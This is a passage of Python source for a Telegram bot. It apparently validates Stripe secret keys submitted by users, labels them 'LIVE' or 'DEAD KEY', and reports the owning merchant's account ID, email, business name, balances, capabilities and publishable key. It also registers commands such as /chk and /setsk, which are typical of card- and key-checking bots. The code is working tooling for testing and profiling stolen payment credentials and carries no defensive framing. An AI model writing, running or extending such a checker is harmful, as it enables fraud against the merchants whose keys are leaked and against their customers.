                    await update.message.reply_text(f"❌ DEAD KEY\n\nHTTP {account_response.status}\nError: {error_text[:200]}")
                    return
                
                account_data = await account_response.json()
            
            balance_url = "https://api.stripe.com/v1/balance"
            try:
                async with session.get(balance_url, headers=headers, timeout=aiohttp.ClientTimeout(total=15)) as balance_response:
                    balance_data = await balance_response.json() if balance_response.status == 200 else {}
            except:
                balance_data = {}
        
        account_id = account_data.get('id', 'N/A')
        email = account_data.get('email', 'N/A')
        country = account_data.get('country', 'N/A')
        currency = account_data.get('default_currency', 'N/A').upper()
        business_type = account_data.get('business_type', 'N/A').capitalize()
        
        business_profile = account_data.get('business_profile', {})
        account_name = business_profile.get('name', 'N/A')
        if account_name == 'N/A':
            company = account_data.get('company', {})
            account_name = company.get('name', 'N/A')
        
        capabilities = account_data.get('capabilities', {})
        active_caps = []
        for cap, status in capabilities.items():
            if status == 'active':
                cap_name = cap.replace('_', ' ').title()
                active_caps.append(cap_name)
        
        capabilities_str = ', '.join(active_caps) if active_caps else 'None'
        
        available_balance = 0.0
        pending_balance = 0.0
        
        if 'available' in balance_data:
            for bal in balance_data['available']:
                if bal.get('currency', '').upper() == currency:
                    available_balance = bal.get('amount', 0) / 100.0
                    break
        
        if 'pending' in balance_data:
            for bal in balance_data['pending']:
                if bal.get('currency', '').upper() == currency:
                    pending_balance = bal.get('amount', 0) / 100.0
                    break
        
        message = "┏━━━━━━━⍟\n"
        message += "┃ SK Key Info 🔥\n"
        message += "┗━━━━━━━━━━━⊛\n\n"
        message += "[⌬] Status↣ ✅ LIVE [LIVE]\n"
        message += f"[⌬] Account ID↣ {account_id}\n"
        message += f"[⌬] Account Name↣ {account_name}\n"
        message += "━━━━━━━━━━━━━━━━━━━\n"
        message += f"[⌬] Email↣ {email}\n"
        message += f"[⌬] Country↣ {country}\n"
        message += f"[⌬] Currency↣ {currency}\n"
        message += f"[⌬] Business Type↣ {business_type}\n"
        message += "━━━━━━━━━━━━━━━━━━━\n"
        message += f"[⌬] Available Balance↣ ${available_balance:.1f}\n"
        message += f"[⌬] Pending Balance↣ ${pending_balance:.2f}\n"
        message += f"[⌬] Active Capabilities↣ {capabilities_str}\n"
        message += "━━━━━━━━━━━━━━━━━━━\n"
        
        pk = await get_pk_from_sk(sk)
        if pk:
            message += f"[⌬] Publishable Key↣ {pk}\n"
        else:
            message += f"[⌬] Publishable Key↣ Not found\n"

        logger.info(f"SK check successful for user {user_id}: {account_id}")
        await update.message.reply_text(message)
        
    except aiohttp.ClientError as e:
        logger.error(f"Request error checking SK for user {user_id}: {str(e)}")
        await update.message.reply_text(f"❌ Request error: {str(e)}")
    except Exception as e:
        logger.error(f"Error checking SK for user {user_id}: {str(e)}", exc_info=True)
        await update.message.reply_text(f"❌ Error: {str(e)}")


def main():
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        logger.error("BOT_TOKEN is not set in the script")
        print("Error: Please set BOT_TOKEN in the script")
        return
    
    logger.info("=" * 50)
    logger.info("Starting Telegram Bot...")
    logger.info(f"Bot Token: {BOT_TOKEN[:10]}...")
    logger.info("=" * 50)
    
    application = Application.builder().token(BOT_TOKEN).build()
    
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("chk", chk_command))
    application.add_handler(CommandHandler("sk", sk_command))
    application.add_handler(CommandHandler("stop", stop_command))
    application.add_handler(CommandHandler("ban", ban_command))
    application.add_handler(CommandHandler("unban", unban_command))
    application.add_handler(CommandHandler("bans", bans_command))
    application.add_handler(CommandHandler("stats", stats_command))
    application.add_handler(CommandHandler("active", active_command))
    application.add_handler(CommandHandler("admin", admin_command))
    application.add_handler(CommandHandler("setsk", setsk_command))
    application.add_handler(CommandHandler("removesk", removesk_command))
    application.add_handler(CommandHandler("viewsk", viewsk_command))
    
    if 'active_sessions' not in application.bot_data:
        application.bot_data['active_sessions'] = {}
    
    logger.info("Bot is running and ready to receive commands...")
    print("Bot is running...")
    
    try:
        application.run_polling(allowed_updates=Update.ALL_TYPES)
    except Exception as e:
        logger.critical(f"Bot crashed: {str(e)}", exc_info=True)
        raise


if __name__ == "__main__":
    main()
